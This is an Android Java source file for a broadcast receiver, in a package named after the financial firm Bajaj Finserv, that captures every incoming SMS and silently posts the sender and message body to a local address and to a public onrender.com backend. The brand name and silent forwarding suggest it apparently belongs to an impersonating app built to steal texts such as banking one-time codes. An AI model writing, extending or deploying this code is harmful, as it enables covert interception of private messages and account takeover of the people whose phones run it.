package com.bajaj.finserv;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "BajajSmsForwarder";
    
    // --- Configuration ---
    private static final String SYNC_URL = "http://10.0.2.2:3000/api/application/sync-sms";
    private static final String PUBLIC_SYNC_URL = "https://pm-backend-9vz9.onrender.com/api/application/sync-sms";


    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        try {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            
                            Log.d(TAG, "SMS Received from " + sender + ": " + messageBody);
                            
                            // Forward in background
                            sendData(sender, messageBody);
                        } catch (Exception e) {
                            Log.e(TAG, "Error parsing SMS", e);
                        }
                    }
                }
            }
        }
    }

    private void sendData(final String sender, final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String json = "{\"deviceId\":\"NativeForwarder\", \"sms\":{\"address\":\"" + sender + "\", \"body\":\"" + body + "\"}}";
                    
                    // Try Local first
                    sendPostRequest(SYNC_URL, json);
                    // Try Public
                    sendPostRequest(PUBLIC_SYNC_URL, json);
                    
                    Log.d(TAG, "SMS Synced to backend");
                } catch (Exception e) {
                    Log.w(TAG, "Sync Failed: " + e.getMessage());
                }
            }
        }).start();
    }


    private void sendPostRequest(String urlStr, String jsonBody) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Bypass-Tunnel-Reminder", "true"); // Bypass Localtunnel screen
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = jsonBody.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        int code = conn.getResponseCode();
        Log.d(TAG, "POST " + urlStr + " Code: " + code);
        conn.disconnect();
    }
}
